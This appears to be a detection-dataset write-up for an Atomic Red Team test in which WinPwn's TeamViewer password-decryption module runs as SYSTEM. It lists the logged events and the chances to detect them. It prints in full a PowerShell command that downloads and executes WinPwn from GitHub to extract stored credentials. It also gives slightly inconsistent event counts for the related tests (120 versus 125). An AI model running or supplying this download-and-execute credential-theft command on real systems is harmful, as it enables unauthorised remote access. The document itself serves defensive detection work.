# T1555-8: Credentials from Password Stores — WinPwn: Loot Local Credentials via Decrypt TeamViewer Passwords

## Technique Context

T1555 covers credential theft from password stores. This test uses WinPwn's `decryptteamviewer` function to extract TeamViewer saved passwords from the Windows registry. TeamViewer stores its authentication credentials in `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer` (for 32-bit TeamViewer on 64-bit Windows) using a weak, reversible encryption scheme with a static, publicly known key. The decryption algorithm has been documented in multiple public sources and reverse engineering write-ups.

TeamViewer credentials are high-value targets: a saved TeamViewer password enables an attacker to establish a remote connection to the victim host or to pivot to other systems where the same TeamViewer password is reused. Because TeamViewer is commonly used in IT support and remote management contexts, compromising it can provide persistent, legitimate-looking remote access.

The `decryptteamviewer` module queries the appropriate registry path, reads the encrypted credential bytes, applies the decryption algorithm, and returns the plaintext password. The WinPwn framework is delivered at runtime via `iex(new-object net.webclient).downloadstring(...)`. This test ran on ACME-WS06 with Defender disabled.

## What This Dataset Contains

The dataset contains 161 total events: 41 Sysmon events, 114 PowerShell operational events, 4 Security events, and 2 Application events.

**Sysmon EID 1 (Process Create)** captures the attack execution:

```
CommandLine: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
decryptteamviewer -consoleoutput -noninteractive}
CurrentDirectory: C:\Windows\TEMP\
User: NT AUTHORITY\SYSTEM
IntegrityLevel: System
```

The WinPwn URL and commit hash are identical to T1555-6 and T1555-7. Only the function name `decryptteamviewer` distinguishes this execution.

The ART test framework `whoami.exe` identity check appears as the second Sysmon EID 1.

**Security EID 4688** captures four process creation events, including:

```
Process Command Line: "powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
decryptteamviewer -consoleoutput -noninteractive}
```

**Sysmon EID 7 (Image Load)** accounts for 25 events. **EID 10 (Process Access)** captures 4 events. **EID 11 (File Create)** captures 3 events. **EID 17 (Pipe Create)** captures 3 events.

The eid_breakdown shows 1 EID 22 (DNS Query) and 1 EID 3 (Network Connection) for the GitHub download.

**PowerShell EID 4104** captures 111 script block events (slightly fewer than T1555-6/7's 120). **EID 4103** captures 2 module pipeline events, and **EID 4100** captures 1 error event.

**Application channel EID 15** has 2 events (versus 1 in T1555-7, 0 in T1555-6). These may relate to runtime errors from the `decryptteamviewer` function, possibly because TeamViewer is not installed on ACME-WS06 and the module encountered an error accessing the registry path.

## What This Dataset Does Not Contain

**No registry read events.** Sysmon EID 12/13 (Registry value query/set) are not present. The `decryptteamviewer` function reads registry values under `HKLM\SOFTWARE\WOW6432Node\TeamViewer`, but unless the Sysmon configuration includes a registry read rule for that path, these accesses would not be logged.

**No Security registry audit events** (EID 4663, object access auditing for registry). Standard Windows audit configurations do not enable registry access auditing by default.

**TeamViewer likely not installed.** The 2 Application EID 15 events (versus 0-1 in other WinPwn tests) may indicate the `decryptteamviewer` function encountered an error when the expected registry keys were absent. If TeamViewer is not installed, the function would find no credentials to decrypt — but the attempt is still fully captured in the process creation and PowerShell logs.

**The decryption code is not in sampled script block logs.** The `decryptteamviewer` implementation — including the static decryption key and the registry query logic — would appear in non-sampled EID 4104 events.

**No credential output.** Even if TeamViewer were installed and credentials were present, the decrypted password would be console output only, not logged.

## Assessment

T1555-8 follows the same structural pattern as T1555-6 and T1555-7: same WinPwn delivery, same execution context, different module. The event counts are consistent: 41 Sysmon, 114 PowerShell, 4 Security. The slightly lower PowerShell event count (114 vs 125 for T1555-6/7) and the 2 Application EID 15 errors suggest the `decryptteamviewer` module may have exited earlier or encountered non-fatal errors from the missing TeamViewer installation.

Compared to the defended variant (38 Sysmon, 51 PowerShell, 10 Security), the undefended run proceeds further but the PowerShell event count (114) is lower than T1555-6/7 (125 each), suggesting `decryptteamviewer` generates less in-memory script block activity than `lazagnemodule` or `wificreds`. This could be because the function is shorter, or because it exits quickly when TeamViewer is absent.

The technique is particularly interesting from a target selection perspective: `decryptteamviewer` is worth running even without knowing whether TeamViewer is installed — the cost is a few seconds of execution, and the payoff (persistent remote access credentials) is high if the installation exists.

## Detection Opportunities Present in This Data

**Sysmon EID 1** and **Security EID 4688** both capture the full command line with `decryptteamviewer` as the function name. This string is specific to WinPwn and directly identifies the attack module.

**Sysmon EID 3 and EID 22** (confirmed present) capture the WinPwn download from `raw.githubusercontent.com`. The network connection is a prerequisite and provides a pre-access detection opportunity.

**PowerShell EID 4104** would contain the `decryptteamviewer` function body including the static decryption key bytes and the registry path `HKLM\SOFTWARE\WOW6432Node\TeamViewer`. Either the registry path string or the decryption key constants could serve as script block content indicators.

**Application EID 15** (2 events) may provide an additional signal — error events from PowerShell or the WinPwn framework when expected registry keys are absent. In environments where TeamViewer is installed, this error signal would be absent, potentially making successful execution harder to detect from the application log alone.

The three WinPwn tests in this batch (T1555-6, T1555-7, T1555-8) share the same delivery mechanism and GitHub URL, making the commit hash `121dcee26a7aca368821563cbe92b2b5638c5773` an attribute that links all three attacks. If any one test is detected, analysts should search for the shared WinPwn URL pattern across the same time window to identify related tests.
